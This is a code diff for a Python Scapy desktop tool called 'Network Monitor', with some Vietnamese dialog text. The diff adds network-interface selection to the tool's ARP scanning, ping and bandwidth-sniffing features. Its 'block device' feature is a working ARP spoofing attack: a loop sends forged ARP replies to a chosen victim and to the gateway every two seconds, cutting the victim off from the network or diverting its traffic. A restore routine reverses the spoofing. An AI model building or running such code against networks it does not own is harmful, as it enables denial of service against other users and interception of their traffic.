@@ -3,13 +3,14 @@ from tkinter import messagebox, simpledialog
 import threading
 import scapy.all as scapy
 from scapy.layers.l2 import ARP, Ether, srp
-from scapy.sendrecv import sendp
+from scapy.sendrecv import sendp, sr1
 import socket
 import psutil
 import time
 import os
 import logging
 from collections import defaultdict
+import ipaddress  # Added for CIDR calculation
 
 # ---- Block environment variables that may cause PermissionError
 os.environ.pop("SSLKEYLOGFILE", None)
@@ -39,40 +40,97 @@ logger.addHandler(file_handler)
 
 
 # ====== Helper Functions (can be used by class methods) ======
-def get_active_network_info():
-    """Extracts information about active network interfaces and returns a primary one."""
+def get_network_cidr(ip_address, netmask):
+    """Calculates the network CIDR (e.g., 192.168.1.0/24) from an IP address and its netmask."""
+    try:
+        network = ipaddress.IPv4Network(f"{ip_address}/{netmask}", strict=False)
+        return str(network)
+    except ipaddress.AddressValueError:
+        return None
+
+
+def get_all_active_interfaces_details():
+    """
+    Extracts detailed information about all active network interfaces (IPv4)
+    and identifies a primary one.
+    Returns:
+        tuple: (dict of interface details, primary_interface_name_str)
+        interface_details_dict: {
+            "interface_name": {
+                "ip": "192.168.1.10",
+                "netmask": "255.255.255.0",
+                "broadcast": "192.168.1.255",
+                "mac": "aa:bb:cc:dd:ee:ff",
+                "cidr": "192.168.1.0/24"
+            },
+            ...
+        }
+    """
     active_interfaces = psutil.net_if_stats()
     net_addrs = psutil.net_if_addrs()
-    info = ""
+    interface_details_dict = {}
     primary_interface_name = None
 
     for interface, stats in active_interfaces.items():
         if stats.isup and interface != 'lo':  # Exclude loopback interface
-            if not primary_interface_name:  # Take the first active non-loopback interface
-                primary_interface_name = interface
+            ipv4_found = False
+            mac_addr = None
+            for addr in net_addrs.get(interface, []):
+                if addr.family == psutil.AF_LINK:  #
+                    mac_addr = addr.address
 
-            for addr in net_addrs[interface]:
+            for addr in net_addrs.get(interface, []):
                 if addr.family == socket.AF_INET:  # IPv4 address
-                    info += f"Interface: {interface}\n"
-                    info += f"  IP Address: {addr.address}\n"
-                    info += f"  Netmask: {addr.netmask}\n"
-                    if addr.broadcast:
-                        info += f"  Broadcast IP: {addr.broadcast}\n"
-                    # Try to get MAC address for the interface
-                    for mac_addr in net_addrs[interface]:
-                        if mac_addr.family == psutil.AF_LINK:
-                            info += f"  MAC Address: {mac_addr.address}\n"
-                    info += "\n"
+                    ipv4_found = True
+                    details = {
+                        'ip': addr.address,
+                        'netmask': addr.netmask,
+                        'broadcast': addr.broadcast if addr.broadcast else "N/A",
+                        'mac': mac_addr if mac_addr else "N/A",
+                        'cidr': get_network_cidr(addr.address, addr.netmask)
+                    }
+                    interface_details_dict[interface] = details
+                    if not primary_interface_name:
+                        primary_interface_name = interface
+                    break  # Take the first IPv4 address for simplicity
+
+            if not ipv4_found and mac_addr:
+                if interface not in interface_details_dict:  # Only add if not already added with IPv4
+                    interface_details_dict[interface] = {
+                        'ip': "N/A",
+                        'netmask': "N/A",
+                        'broadcast': "N/A",
+                        'mac': mac_addr,
+                        'cidr': "N/A"
+                    }
+
+    return interface_details_dict, primary_interface_name
+
+
+def get_active_network_info():
+    """Extracts information about active network interfaces and returns a primary one for display."""
+    interface_details_dict, primary_interface_name = get_all_active_interfaces_details()
+    info = ""
+    for interface, details in interface_details_dict.items():
+        info += f"Interface: {interface}\n"
+        info += f"  IP Address: {details['ip']}\n"
+        info += f"  Netmask: {details['netmask']}\n"
+        if details['broadcast'] != "N/A":
+            info += f"  Broadcast IP: {details['broadcast']}\n"
+        info += f"  MAC Address: {details['mac']}\n"
+        if details['cidr'] != "N/A":
+            info += f"  CIDR: {details['cidr']}\n"
+        info += "\n"
     return info if info else "No active network interfaces found with IPv4.", primary_interface_name
 
 
-def scan_network(ip_range):
+def scan_network(ip_range, iface=None):
     """Scans the specified IP range for active devices using ARP requests."""
     arp = ARP(pdst=ip_range)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
     packet = ether / arp
     # srp sends and receives layer 2 packets, timeout in seconds, verbose=0 means no output to console
-    result = srp(packet, timeout=3, verbose=0)[0]
+    result = srp(packet, timeout=3, verbose=0, iface=iface)[0]  # Pass iface here
     devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
     return devices
 
@@ -85,10 +143,10 @@ def save_devices_to_file(devices, filename="network_devices.txt"):
     logger.info(f"Devices saved to {filename}")
 
 
-def get_mac(ip):
+def get_mac(ip, iface=None):
     """Retrieves the MAC address for a given IP address using ARP request."""
     # srp sends a packet on layer 2 (Ethernet)
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=iface)  # Pass iface
     for snd, rcv in ans:
         return rcv[Ether].src  # Return the source MAC from the received Ethernet frame
     return None
@@ -129,10 +187,8 @@ class NetworkToolGUI:
 
         self.root = ctk.CTk()
         self.root.title("Network Monitor")
-        # --- MODIFICATION START ---
-        self.root.geometry("1250x700")  # Adjusted initial size
-        self.root.minsize(1000, 600)  # Adjusted minimum size
-        # --- MODIFICATION END ---
+        self.root.geometry("1250x700")
+        self.root.minsize(1000, 600)
 
         # Colors (Black-Gray theme inspired by EBS-Tool-Pack style)
         self.colors = {
@@ -166,13 +222,19 @@ class NetworkToolGUI:
         # Local machine info
         self.my_ip = get_my_ip()
         self.my_mac = get_my_mac()
-        self.active_interface_name = None
+        # self.active_interface_name is removed, using selected_interface_var
+
+        # Interface management variables
+        self.all_interface_details = {}  # To store details from get_all_active_interfaces_details
+        self.interface_names = []  # List of names for the dropdown
+        self.selected_interface_var = ctk.StringVar(value="Select an Interface")  # Default value for dropdown
 
         # Main container
         self.main_container = ctk.CTkFrame(self.root, fg_color=self.colors['bg'])
         self.main_container.pack(fill="both", expand=True, padx=20, pady=20)
 
         self._setup_ui()
+        self._populate_interface_dropdown()  # Initial population
 
     def _setup_ui(self):
         """Sets up all the GUI widgets and layout."""
@@ -218,7 +280,8 @@ class NetworkToolGUI:
                                                                                                                     0,
                                                                                                                     10),
                                                                                                                 pady=5)
-        self.ip_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter IP range for scanning",
+        self.ip_entry = ctk.CTkEntry(input_frame,
+                                     placeholder_text="Enter IP range for scanning (optional if interface selected)",
                                      fg_color=self.colors['bg'], border_color=self.colors['accent'])
         self.ip_entry.grid(row=0, column=1, sticky="ew", pady=5)
 
@@ -232,6 +295,20 @@ class NetworkToolGUI:
         self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter Gateway IP for blocking",
                                           fg_color=self.colors['bg'], border_color=self.colors['accent'])
         self.gateway_entry.grid(row=1, column=1, sticky="ew", pady=5)
+
+        # Interface Selection
+        ctk.CTkLabel(input_frame, text="Select Interface:", text_color=self.colors['text']).grid(row=2, column=0,
+                                                                                                 sticky="w",
+                                                                                                 padx=(0, 10),
+                                                                                                 pady=5)
+        self.interface_optionmenu = ctk.CTkOptionMenu(input_frame,
+                                                      values=self.interface_names,
+                                                      variable=self.selected_interface_var,
+                                                      command=self._on_interface_selected,
+                                                      fg_color=self.colors['bg'],
+                                                      button_color=self.colors['accent'],
+                                                      button_hover_color=self.colors['accent_hover'])
+        self.interface_optionmenu.grid(row=2, column=1, sticky="ew", pady=5)
 
         # Action Buttons Frame (right side of input_action_panel)
         action_buttons_frame = ctk.CTkFrame(input_action_panel, fg_color="transparent")
@@ -249,6 +326,14 @@ class NetworkToolGUI:
                                       height=35)
         self.btn_scan.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
 
+        # New Refresh Interfaces button
+        self.btn_refresh_interfaces = ctk.CTkButton(action_buttons_frame, text="Refresh Interfaces",
+                                                    command=self._populate_interface_dropdown,
+                                                    fg_color=self.colors['accent'],
+                                                    hover_color=self.colors['accent_hover'],
+                                                    height=35)
+        self.btn_refresh_interfaces.grid(row=2, column=1, sticky="ew", padx=5, pady=5)
+
         self.btn_monitor_bandwidth = ctk.CTkButton(action_buttons_frame, text="Start Bandwidth Monitor",
                                                    command=self._start_stop_bandwidth_monitor,
                                                    fg_color=self.colors['success'],
@@ -263,20 +348,17 @@ class NetworkToolGUI:
                                              height=35)
         self.btn_unblock_all.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
 
-        # --- MODIFICATION START ---
         # New Ping Device button
         self.btn_ping_device = ctk.CTkButton(action_buttons_frame, text="Ping Device",
                                              command=self._start_ping_test_dialog,
                                              fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                              height=35)
-        self.btn_ping_device.grid(row=2, column=0, sticky="ew", padx=5, pady=5)
+        self.btn_ping_device.grid(row=3, column=0, sticky="ew", padx=5, pady=5)
 
         # Status Indicator (Blocking and Bandwidth Monitor) - shifted to a new row
         self.blocking_status_label = ctk.CTkLabel(action_buttons_frame, text="Status: Idle",
                                                   text_color=self.colors['text_dim'])
-        self.blocking_status_label.grid(row=3, column=0, sticky="ew", padx=5, pady=5, columnspan=2)
-        # --- MODIFICATION END ---
-
+        self.blocking_status_label.grid(row=4, column=0, sticky="ew", padx=5, pady=5, columnspan=2)
 
         # Log Panel (now on the left, row 1, column 0)
         log_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
@@ -318,6 +400,45 @@ class NetworkToolGUI:
         )
         self.devices_scroll_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))
 
+    def _populate_interface_dropdown(self):
+        """Fetches active interfaces and populates the dropdown menu."""
+        self.all_interface_details, primary_interface_name = get_all_active_interfaces_details()
+        self.interface_names = list(self.all_interface_details.keys())
+
+        if not self.interface_names:
+            self.interface_names = ["No active interfaces found"]
+            self.selected_interface_var.set("No active interfaces found")
+            self.gui_log_output("No active network interfaces found.", "warning")
+            logger.warning("No active network interfaces found to populate dropdown.")
+        else:
+            self.interface_optionmenu.configure(values=self.interface_names)
+            if primary_interface_name and primary_interface_name in self.interface_names:
+                self.selected_interface_var.set(primary_interface_name)
+                self.gui_log_output(f"Default interface selected: {primary_interface_name}", "blue")
+            else:
+                self.selected_interface_var.set(self.interface_names[0])
+                self.gui_log_output(f"Selected first available interface: {self.interface_names[0]}", "blue")
+        self.interface_optionmenu.set(self.selected_interface_var.get())  # Ensure UI updates
+
+    def _on_interface_selected(self, choice):
+        """Callback for when an interface is selected from the dropdown."""
+        self.gui_log_output(f"Interface selected: {choice}", "blue")
+        if choice in self.all_interface_details and self.all_interface_details[choice]['cidr'] != "N/A":
+            self.ip_entry.delete(0, ctk.END)
+            self.ip_entry.insert(0, self.all_interface_details[choice]['cidr'])
+
+            ip_addr_parts = self.all_interface_details[choice]['ip'].split('.')
+            if len(ip_addr_parts) == 4:
+                default_gw_guess = f"{ip_addr_parts[0]}.{ip_addr_parts[1]}.{ip_addr_parts[2]}.1"
+                self.gateway_entry.delete(0, ctk.END)
+                self.gateway_entry.insert(0, default_gw_guess)
+                self.gui_log_output(f"Guessed gateway for {choice}: {default_gw_guess}", "blue")
+        else:
+            self.ip_entry.delete(0, ctk.END)  # Clear if selected interface has no CIDR
+            self.gateway_entry.delete(0, ctk.END)  # Clear gateway too
+            self.gui_log_output(
+                f"Selected interface {choice} has no valid IPv4 details; clearing IP Range and Gateway.", "yellow")
+
     def gui_log_output(self, message: str, color_tag: str = None):
         """Thread-safe logging to the GUI textbox with colors and to a file."""
         logger.info(message)
@@ -356,15 +477,19 @@ class NetworkToolGUI:
         self.btn_scan.configure(state=state)
         self.ip_entry.configure(state=state)
         self.gateway_entry.configure(state=state)
-        # --- MODIFICATION START ---
-        self.btn_ping_device.configure(state=state) # Add ping button to general state management
-        # --- MODIFICATION END ---
+        self.btn_ping_device.configure(state=state)
+        self.interface_optionmenu.configure(state=state)
+        self.btn_refresh_interfaces.configure(state=state)
 
         # Bandwidth monitor button state
-        if not self.blocking_active and not busy and not self.bandwidth_monitor_active:
-            self.btn_monitor_bandwidth.configure(state="normal")
-        else:
+        if busy:
             self.btn_monitor_bandwidth.configure(state="disabled")
+        elif self.bandwidth_monitor_active:
+            self.btn_monitor_bandwidth.configure(state="normal", text="Stop Bandwidth Monitor",
+                                                 fg_color=self.colors['error'], hover_color=self.colors['error'])
+        else:
+            self.btn_monitor_bandwidth.configure(state="normal", text="Start Bandwidth Monitor",
+                                                 fg_color=self.colors['success'], hover_color=self.colors['success'])
 
         # Device-specific block buttons
         for device_frame in self.devices_scroll_frame.winfo_children():
@@ -402,19 +527,14 @@ class NetworkToolGUI:
     def show_network_info_task(self):
         """Task to fetch and display network information."""
         try:
-            info, interface_name = get_active_network_info()
-            self.active_interface_name = interface_name
-            if not self.active_interface_name:
-                self.gui_log_output("Warning: Could not determine primary active network interface for sniffing.",
-                                    "yellow")
-                logger.warning("Could not determine primary active network interface for sniffing.")
+            info, primary_interface_name = get_active_network_info()  # Now using adapted function
 
             self.root.after(0, lambda: self.log_textbox.configure(state="normal"))
             self.root.after(0, lambda: self.log_textbox.delete("1.0", ctk.END))
             self.gui_log_output("--- Active Network Information ---", "blue")
             self.gui_log_output(info, "default")
-            if self.active_interface_name:
-                self.gui_log_output(f"Primary sniffing interface detected: {self.active_interface_name}", "blue")
+            if primary_interface_name:
+                self.gui_log_output(f"Primary sniffing interface detected: {primary_interface_name}", "blue")
             self.gui_log_output("--- End Network Information ---", "blue")
             self.root.after(0, lambda: self.log_textbox.configure(state="disabled"))
         except Exception as e:
@@ -425,25 +545,43 @@ class NetworkToolGUI:
 
     def _start_scan(self):
         """Initiates network scanning in a separate thread."""
-        ip_range = self.ip_entry.get().strip()
-        if not ip_range:
-            messagebox.showwarning("Cảnh báo", "Hãy nhập phạm vi IP!")
+        selected_interface = self.selected_interface_var.get()
+        manual_ip_range = self.ip_entry.get().strip()
+        actual_ip_range = manual_ip_range  # Default to manually entered
+
+        if selected_interface != "Select an Interface" and selected_interface != "No active interfaces found":
+            interface_details = self.all_interface_details.get(selected_interface)
+            if interface_details and interface_details['cidr'] != "N/A":
+                actual_ip_range = interface_details['cidr']
+                self.gui_log_output(f"Using IP range from selected interface {selected_interface}: {actual_ip_range}",
+                                    "blue")
+            else:
+                self.gui_log_output(
+                    f"Selected interface {selected_interface} has no valid IPv4/CIDR. Falling back to manual IP range.",
+                    "yellow")
+        else:
+            self.gui_log_output("No interface selected. Using manual IP range entry (if provided).", "blue")
+
+        if not actual_ip_range:
+            messagebox.showwarning("Cảnh báo", "Hãy nhập phạm vi IP hoặc chọn một giao diện để quét!")
             return
 
         self._set_ui_busy_state(True)
-        self.gui_log_output(f"Scanning network for devices in range: {ip_range}...", "blue")
+        self.gui_log_output(
+            f"Scanning network for devices in range: {actual_ip_range} on interface {selected_interface}...", "blue")
         self.scan_progress_bar.set(0)
-        threading.Thread(target=self.scan_network_task, args=(ip_range,), daemon=True).start()
+        threading.Thread(target=self.scan_network_task, args=(actual_ip_range, selected_interface,),
+                         daemon=True).start()
 
-    def scan_network_task(self, ip_range):
+    def scan_network_task(self, ip_range, scan_interface):
         """Task to scan the network and display results."""
         try:
             self.root.after(0, lambda: self.clear_device_list())
-            self.gui_log_output(f"Starting ARP scan for {ip_range}...", "blue")
+            self.gui_log_output(f"Starting ARP scan for {ip_range} on interface {scan_interface}...", "blue")
 
             self.root.after(0, lambda: self.scan_progress_bar.set(0.1))
 
-            devices = scan_network(ip_range)
+            devices = scan_network(ip_range, iface=scan_interface)  # Pass the interface to scan_network
 
             self.gui_log_output(f"--- Found {len(devices)} Devices ---", "green")
             self.root.after(0, lambda: self.update_device_list(devices))
@@ -544,6 +682,12 @@ class NetworkToolGUI:
                                    "Hãy nhập địa chỉ IP Gateway để chặn!")
             return
 
+        selected_interface = self.selected_interface_var.get()
+        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
+            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện chặn.")
+            self.gui_log_output("Cannot start blocking: No valid interface selected.", "yellow")
+            return
+
         if not self.my_ip or not self.my_mac:
             messagebox.showerror("Lỗi",
                                  "Không thể lấy địa chỉ IP/MAC cục bộ của bạn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
@@ -554,10 +698,12 @@ class NetworkToolGUI:
         self.blocked_device_mac = mac_address
 
         self.gui_log_output(
-            f"Attempting to block device - IP: {ip_address}, MAC: {mac_address} via Gateway: {gateway_ip}", "red")
+            f"Attempting to block device - IP: {ip_address}, MAC: {mac_address} via Gateway: {gateway_ip} on interface {selected_interface}",
+            "red")
         self.blocking_active = True
         self.blocking_thread = threading.Thread(target=self.block_device_task,
-                                                args=(ip_address, mac_address, gateway_ip, self.my_ip, self.my_mac),
+                                                args=(ip_address, mac_address, gateway_ip, self.my_ip, self.my_mac,
+                                                      selected_interface),
                                                 daemon=True)
         self.blocking_thread.start()
 
@@ -565,7 +711,7 @@ class NetworkToolGUI:
                                                                         text_color=self.colors['error']))
         self.root.after(0, lambda: self._set_ui_busy_state(True, ip_address))
 
-    def block_device_task(self, ip_address, mac_address, gateway_ip, my_ip, my_mac):
+    def block_device_task(self, ip_address, mac_address, gateway_ip, my_ip, my_mac, spoofing_interface):
         """Task to continuously send ARP spoofing packets."""
         try:
             if ip_address == my_ip or mac_address == my_mac:
@@ -573,22 +719,25 @@ class NetworkToolGUI:
                 logger.error("Attempted to block own device.")
                 return
 
-            gateway_mac = get_mac(gateway_ip)
+            gateway_mac = get_mac(gateway_ip, iface=spoofing_interface)  # Pass interface to get_mac
             if not gateway_mac:
                 self.gui_log_output("Could not find MAC address of gateway. Blocking failed.", "red")
-                logger.error(f"Could not find MAC for gateway {gateway_ip}. Blocking failed.")
+                logger.error(
+                    f"Could not find MAC for gateway {gateway_ip} on interface {spoofing_interface}. Blocking failed.")
                 return
 
-            self.gui_log_output(f"Spoofing ARP for target ({ip_address}) and gateway ({gateway_ip})...", "red")
-            logger.warning(f"ARP spoofing started for {ip_address} via {gateway_ip}")
+            self.gui_log_output(
+                f"Spoofing ARP for target ({ip_address}) and gateway ({gateway_ip}) on interface {spoofing_interface}...",
+                "red")
+            logger.warning(f"ARP spoofing started for {ip_address} via {gateway_ip} on interface {spoofing_interface}")
 
             while self.blocking_active:
                 packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address,
                                                              hwsrc=my_mac)
                 packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac,
                                                               hwsrc=my_mac)
-                sendp(packet_victim, verbose=0)
-                sendp(packet_gateway, verbose=0)
+                sendp(packet_victim, verbose=0, iface=spoofing_interface)  # Specify interface
+                sendp(packet_gateway, verbose=0, iface=spoofing_interface)  # Specify interface
                 time.sleep(2)
 
             self.gui_log_output(f"Blocking of device with IP {ip_address} has stopped.", "green")
@@ -625,11 +774,17 @@ class NetworkToolGUI:
         self.blocked_device_ip = None
         self.blocked_device_mac = None
 
+        selected_interface = self.selected_interface_var.get()
+        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
+            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện bỏ chặn.")
+            self.gui_log_output("Cannot start unblocking: No valid interface selected.", "yellow")
+            return
+
         self._set_ui_busy_state(True)
         self.gui_log_output("Attempting to unblock all devices...", "green")
-        threading.Thread(target=self.unblock_devices_task, daemon=True).start()
+        threading.Thread(target=self.unblock_devices_task, args=(selected_interface,), daemon=True).start()
 
-    def unblock_devices_task(self):
+    def unblock_devices_task(self, unblocking_interface):
         """Task to restore ARP tables for previously blocked devices."""
         try:
             gateway_ip = self.gateway_entry.get().strip()
@@ -668,14 +823,16 @@ class NetworkToolGUI:
                 logger.warning("No devices recorded in 'network_devices.txt' to unblock.")
                 return
 
-            self.gui_log_output(f"Restoring ARP for {len(devices_to_unblock)} devices...", "green")
-            logger.info(f"Initiating ARP restoration for {len(devices_to_unblock)} devices.")
+            self.gui_log_output(
+                f"Restoring ARP for {len(devices_to_unblock)} devices on interface {unblocking_interface}...", "green")
+            logger.info(
+                f"Initiating ARP restoration for {len(devices_to_unblock)} devices on interface {unblocking_interface}.")
 
             for device in devices_to_unblock:
                 ip_address = device['ip']
 
-                victim_mac = get_mac(ip_address)
-                gateway_mac = get_mac(gateway_ip)
+                victim_mac = get_mac(ip_address, iface=unblocking_interface)  # Pass interface to get_mac
+                gateway_mac = get_mac(gateway_ip, iface=unblocking_interface)  # Pass interface
 
                 if victim_mac and gateway_mac:
                     packet_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=ip_address, psrc=gateway_ip,
@@ -683,15 +840,16 @@ class NetworkToolGUI:
                     packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address,
                                                                   hwdst=gateway_mac, hwsrc=victim_mac)
 
-                    sendp(packet_victim, verbose=0, count=7)
-                    sendp(packet_gateway, verbose=0, count=7)
+                    sendp(packet_victim, verbose=0, count=7, iface=unblocking_interface)  # Specify interface
+                    sendp(packet_gateway, verbose=0, count=7, iface=unblocking_interface)  # Specify interface
                     self.gui_log_output(f"Restored ARP for IP: {ip_address}", "green")
-                    logger.info(f"ARP restored for {ip_address}")
+                    logger.info(f"ARP restored for {ip_address} on interface {unblocking_interface}")
                 else:
-                    self.gui_log_output(f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway).",
-                                        "warning")
+                    self.gui_log_output(
+                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway on interface {unblocking_interface}).",
+                        "warning")
                     logger.warning(
-                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway).")
+                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway on interface {unblocking_interface}).")
                 time.sleep(0.5)
 
             self.gui_log_output("All devices should now be unblocked.", "green")
@@ -711,13 +869,15 @@ class NetworkToolGUI:
     # --- Bandwidth Monitoring Functions ---
     def _start_stop_bandwidth_monitor(self):
         """Toggles the bandwidth monitoring on or off."""
-        if not self.bandwidth_monitor_active:
-            if not self.active_interface_name:
-                messagebox.showwarning("Cảnh báo",
-                                       "Không thể bắt đầu theo dõi băng thông. Vui lòng chạy 'Show Network Info' để xác định giao diện hoạt động.")
-                self.gui_log_output("Cannot start bandwidth monitor: Active interface not determined.", "yellow")
-                return
+        selected_interface = self.selected_interface_var.get()
 
+        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
+            messagebox.showwarning("Cảnh báo",
+                                   "Vui lòng chọn một giao diện để bắt đầu theo dõi băng thông.")
+            self.gui_log_output("Cannot start bandwidth monitor: No valid interface selected.", "yellow")
+            return
+
+        if not self.bandwidth_monitor_active:
             if not self.my_ip:
                 messagebox.showwarning("Cảnh báo", "Không thể lấy địa chỉ IP của bạn. Vui lòng kiểm tra kết nối mạng.")
                 self.gui_log_output("Cannot start bandwidth monitor: Local IP not determined.", "yellow")
@@ -731,14 +891,14 @@ class NetworkToolGUI:
             self.bandwidth_monitor_active = True
             self.btn_monitor_bandwidth.configure(text="Stop Bandwidth Monitor", fg_color=self.colors['error'],
                                                  hover_color=self.colors['error'])
-            self.gui_log_output(f"Starting bandwidth monitor on interface '{self.active_interface_name}'...", "green")
-            logger.info(f"Bandwidth monitor started on {self.active_interface_name}")
+            self.gui_log_output(f"Starting bandwidth monitor on interface '{selected_interface}'...", "green")
+            logger.info(f"Bandwidth monitor started on {selected_interface}")
 
             with self.bandwidth_lock:
                 self.current_bytes_per_ip.clear()
 
             self.bandwidth_thread = threading.Thread(target=self._bandwidth_sniff_task,
-                                                     args=(self.active_interface_name,), daemon=True)
+                                                     args=(selected_interface,), daemon=True)  # Pass selected_interface
             self.bandwidth_thread.start()
             self.bandwidth_update_job_id = self.root.after(self.bandwidth_monitor_interval_ms,
                                                            self._update_bandwidth_gui)
@@ -783,7 +943,7 @@ class NetworkToolGUI:
             self.gui_log_output(f"Error during bandwidth sniffing: {e}", "red")
             logger.critical(f"Critical error during bandwidth sniffing: {e}")
         finally:
-            if self.bandwidth_monitor_active:
+            if self.bandwidth_monitor_active:  # If still active here, means an unexpected stop
                 self.root.after(0, self._stop_bandwidth_monitor_task)
 
     def _packet_callback(self, packet):
@@ -835,7 +995,6 @@ class NetworkToolGUI:
 
         self.bandwidth_update_job_id = self.root.after(self.bandwidth_monitor_interval_ms, self._update_bandwidth_gui)
 
-    # --- MODIFICATION START ---
     def _start_ping_test_dialog(self):
         """Prompts the user for an IP address to ping and starts the ping task."""
         if self.blocking_active or self.bandwidth_monitor_active:
@@ -843,27 +1002,33 @@ class NetworkToolGUI:
             self.gui_log_output("Cannot start Ping Test while blocking or bandwidth monitoring is active.", "yellow")
             return
 
+        selected_interface = self.selected_interface_var.get()
+        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
+            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện Ping Test.")
+            self.gui_log_output("Cannot start Ping Test: No valid interface selected.", "yellow")
+            return
+
         ip_to_ping = simpledialog.askstring("Ping Device", "Nhập địa chỉ IP để ping:", parent=self.root)
         if ip_to_ping:
             # Basic IP validation
             try:
-                socket.inet_aton(ip_to_ping) # Check if it's a valid IPv4 address
+                socket.inet_aton(ip_to_ping)  # Check if it's a valid IPv4 address
             except socket.error:
                 messagebox.showerror("Lỗi", "Địa chỉ IP không hợp lệ!")
                 self.gui_log_output(f"Invalid IP address entered for ping: {ip_to_ping}", "red")
                 return
 
             self._set_ui_busy_state(True)
-            self.gui_log_output(f"Starting ping test to {ip_to_ping}...", "blue")
-            threading.Thread(target=self.ping_test_task, args=(ip_to_ping,), daemon=True).start()
+            self.gui_log_output(f"Starting ping test to {ip_to_ping} on interface {selected_interface}...", "blue")
+            threading.Thread(target=self.ping_test_task, args=(ip_to_ping, selected_interface,), daemon=True).start()
 
-    def ping_test_task(self, ip_address, count=4):
+    def ping_test_task(self, ip_address, ping_interface, count=4):
         """Task to perform a series of pings and display results."""
         successful_pings = 0
-        rtts = [] # Round Trip Times
+        rtts = []  # Round Trip Times
 
-        self.gui_log_output(f"Pinging {ip_address} with {count} packets:", "blue")
-        logger.info(f"Initiating ping to {ip_address} with {count} packets.")
+        self.gui_log_output(f"Pinging {ip_address} with {count} packets on interface {ping_interface}:", "blue")
+        logger.info(f"Initiating ping to {ip_address} with {count} packets on interface {ping_interface}.")
 
         try:
             for i in range(1, count + 1):
@@ -872,29 +1037,34 @@ class NetworkToolGUI:
                 # sr1 sends a packet and waits for the first answer
                 # timeout is in seconds
                 # verbose=0 suppresses Scapy's default output
-                ans = scapy.sr1(scapy.IP(dst=ip_address)/scapy.ICMP(), timeout=1, verbose=0)
+                ans = sr1(scapy.IP(dst=ip_address) / scapy.ICMP(), timeout=1, verbose=0,
+                          iface=ping_interface)  # Specify interface
                 end_time = time.time()
 
                 if ans:
                     rtt_ms = (end_time - start_time) * 1000
                     rtts.append(rtt_ms)
                     successful_pings += 1
-                    self.gui_log_output(f"Reply from {ip_address}: bytes={len(ans)} time={rtt_ms:.2f}ms TTL={ans.ttl}", "green")
+                    self.gui_log_output(f"Reply from {ip_address}: bytes={len(ans)} time={rtt_ms:.2f}ms TTL={ans.ttl}",
+                                        "green")
                 else:
                     self.gui_log_output(f"Request timed out to {ip_address}", "red")
-                time.sleep(0.5) # Small delay between pings
+                time.sleep(0.5)  # Small delay between pings
 
             # Summarize results
             packet_loss = ((count - successful_pings) / count) * 100
             self.gui_log_output("\n--- Ping Statistics ---", "blue")
-            self.gui_log_output(f"Packets: Sent = {count}, Received = {successful_pings}, Lost = {count - successful_pings} ({packet_loss:.0f}% loss)", "blue")
+            self.gui_log_output(
+                f"Packets: Sent = {count}, Received = {successful_pings}, Lost = {count - successful_pings} ({packet_loss:.0f}% loss)",
+                "blue")
 
             if rtts:
                 min_rtt = min(rtts)
                 max_rtt = max(rtts)
                 avg_rtt = sum(rtts) / len(rtts)
                 self.gui_log_output(f"Approximate round trip times in milli-seconds:", "blue")
-                self.gui_log_output(f"    Minimum = {min_rtt:.2f}ms, Maximum = {max_rtt:.2f}ms, Average = {avg_rtt:.2f}ms", "blue")
+                self.gui_log_output(
+                    f"    Minimum = {min_rtt:.2f}ms, Maximum = {max_rtt:.2f}ms, Average = {avg_rtt:.2f}ms", "blue")
             else:
                 self.gui_log_output("No successful replies received.", "red")
 
@@ -904,7 +1074,6 @@ class NetworkToolGUI:
         finally:
             self.root.after(0, lambda: self._set_ui_busy_state(False))
             self.gui_log_output(f"Ping test to {ip_address} completed.", "blue")
-    # --- MODIFICATION END ---
 
     def run(self):
         """Starts the main GUI event loop."""
